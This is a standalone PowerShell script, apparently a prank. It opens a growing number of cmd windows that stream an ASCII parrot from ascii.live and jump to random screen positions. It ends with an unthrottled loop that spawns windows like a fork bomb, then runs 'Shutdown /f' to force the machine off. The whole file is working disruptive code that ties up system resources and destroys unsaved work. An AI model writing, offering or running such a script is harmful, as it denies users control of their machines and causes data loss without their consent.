function Parrot-Spawner {
    Start-Job -ScriptBlock {
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WindowManipulation {
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
}
"@
        while ($true) {  # This creates an infinite loop
            $randomX = Get-Random -Minimum 0 -Maximum 1800
            $randomY = Get-Random -Minimum 0 -Maximum 800
            
            $process = Start-Process cmd -ArgumentList "/k", "mode con: cols=50 lines=20 & curl ascii.live/parrot" -PassThru
            
            Start-Sleep -Seconds 1  # Give it time to open
            
            # Get the main window handle using the process ID
            $hwnd = $process.MainWindowHandle
            
            # Move the window
            [WindowManipulation]::MoveWindow($hwnd, $randomX, $randomY, 400, 365, $true)
                        Start-Sleep -Seconds 15
        }
    }
}

Parrot-Spawner
Start-Sleep -Seconds 127
Parrot-Spawner
Start-Sleep -Seconds 63
Parrot-Spawner
Start-Sleep -Seconds 20
Parrot-Spawner
Start-Sleep -Seconds 8
Parrot-Spawner
Start-Sleep -Seconds 2
Start-Job -ScriptBlock {
    while ($true) {
        Start-Process cmd -ArgumentList "/k", "mode con: cols=50 lines=20 & curl ascii.live/parrot"
    }
}
Start-Sleep -Seconds 10
Shutdown /f